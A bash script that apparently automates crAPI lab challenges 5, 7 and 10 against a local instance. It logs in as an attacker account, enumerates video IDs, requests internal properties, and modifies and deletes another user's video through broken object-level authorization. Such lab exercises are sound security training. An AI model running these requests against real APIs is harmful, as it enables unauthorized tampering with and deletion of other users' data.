#!/bin/bash
# crAPI Challenges 5,7,10: Video Exploits
# Multi-step: Upload video → discover internal properties →
# delete another user's video → modify video properties
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain5_video.log"
> "$LOG"

echo "=== crAPI Chain: Video Exploits (Challenges 5, 7, 10) ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Login
echo "--- Step 1: Login ---" | tee -a "$LOG"
TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 2: List videos (discover what's available)
echo "--- Step 2: List all user videos ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/videos" | \
  python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3: Try to access specific video IDs (BOLA on videos)
echo "--- Step 3: Enumerate video IDs ---" | tee -a "$LOG"
for VID in 1 2 3 4 5; do
  echo -n "  Video $VID: " | tee -a "$LOG"
  curl -s -H "Authorization: Bearer $TOKEN" \
    "$BASE/identity/api/v2/user/videos/$VID" | head -c 200 | tee -a "$LOG"
  echo "" | tee -a "$LOG"
done
echo "" | tee -a "$LOG"

# Step 4: Try to access video with internal properties exposed
echo "--- Step 4: Try to get video with all properties (Challenge 5) ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" \
  "$BASE/identity/api/v2/user/videos/1?include_internal=true" | \
  python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Try to PUT/modify another user's video (Challenge 10)
echo "--- Step 5: Try to modify another user's video properties ---" | tee -a "$LOG"
curl -s -X PUT "$BASE/identity/api/v2/user/videos/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"video_name":"hacked.mp4"}' | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 6: Try to DELETE another user's video (Challenge 7)
echo "--- Step 6: Try to delete another user's video ---" | tee -a "$LOG"
curl -s -X DELETE "$BASE/identity/api/v2/user/videos/1" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "=== Video Exploits Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
